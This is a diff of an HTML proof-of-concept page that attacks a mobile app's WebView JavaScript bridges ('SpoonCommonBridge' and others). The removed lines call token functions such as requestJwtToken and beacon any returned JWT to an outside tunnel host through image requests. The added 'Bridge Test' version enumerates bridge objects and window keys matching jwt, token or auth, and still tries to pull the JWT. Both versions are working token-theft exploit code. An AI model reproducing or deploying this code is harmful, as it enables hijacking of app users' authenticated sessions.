@@ -1,21 +1,36 @@
 <html><head><title>POC</title></head>
-<body style="background:#fff;color:#000;font-size:28px;padding:20px;font-family:monospace;">
-<h1>PoC</h1>
-<div id="s" style="font-size:32px;font-weight:bold;">...</div>
-<pre id="r" style="font-size:20px;white-space:pre-wrap;word-break:break-all;"></pre>
+<body style="background:#fff;color:#000;font-size:20px;padding:10px;font-family:monospace;">
+<h1>Bridge Test</h1>
+<div id="s" style="font-size:28px;font-weight:bold;">...</div>
+<pre id="r" style="font-size:14px;white-space:pre-wrap;word-break:break-all;"></pre>
 <script>
-var CB="https://aa6cec290f9d62a3-1-229-247-42.serveousercontent.com";
 var s=document.getElementById("s"),r=document.getElementById("r"),log=[];
 function L(t){log.push(t);r.textContent=log.join("\n");}
-function ping(l,d){new Image().src=CB+"/x/"+l+"?d="+encodeURIComponent(String(d));}
-L("start");ping("alive","1");
-var bs=["SpoonCommonBridge","SpoonWebBridge","NativeBridge"];
-for(var i=0;i<bs.length;i++){try{var o=window[bs[i]];
-if(o){L("BRIDGE:"+bs[i]);ping("br",bs[i]);
-["requestJwtToken","getJwtToken","getJwt"].forEach(function(m){
-try{if(typeof o[m]==="function"){var t=o[m]();
-if(t){L(bs[i]+"."+m+"="+String(t).substring(0,100));s.textContent="JWT:"+String(t).substring(0,40)+"...";s.style.color="green";ping("jwt_"+bs[i]+"_"+m,String(t));}
-else{L(bs[i]+"."+m+"=null");ping("n_"+bs[i]+"_"+m,"0");}
-}}catch(e){L(bs[i]+"."+m+"ERR:"+e.message);}});}}catch(e){}}
-if(log.length===1){L("NO BRIDGE");s.textContent="NO BRIDGE";ping("nobridge","0");}
-</script></body></html>
+
+// 1. Check specific bridges
+var targets=["SpoonCommonBridge","SpoonWebBridge","NativeBridge","Android"];
+for(var i=0;i<targets.length;i++){
+  try{var o=window[targets[i]];
+    if(o){L("FOUND:"+targets[i]+" keys="+Object.keys(o).join(","));}
+    else{L(targets[i]+": null");}
+  }catch(e){L(targets[i]+":"+e.message);}
+}
+
+// 2. List ALL window keys with relevant names
+var all=Object.keys(window);
+var rel=all.filter(function(k){return /bridge|spoon|native|jwt|token|auth/i.test(k);});
+L("--- relevant keys: "+(rel.length?rel.join(", "):"NONE"));
+
+// 3. Try enumerating iframe content
+L("--- total window keys: "+all.length);
+
+// 4. Try direct call anyway
+try{var t=window.SpoonCommonBridge&&window.SpoonCommonBridge.requestJwtToken&&window.SpoonCommonBridge.requestJwtToken();
+if(t){s.textContent="JWT:"+String(t).substring(0,40)+"...";s.style.color="green";L("JWT="+String(t).substring(0,80));}
+else{L("requestJwtToken: no return");}
+}catch(e){L("call err: "+e.message);}
+
+if(s.textContent==="..."){s.textContent="NO BRIDGE";s.style.color="red";}
+</script>
+</body>
+</html>
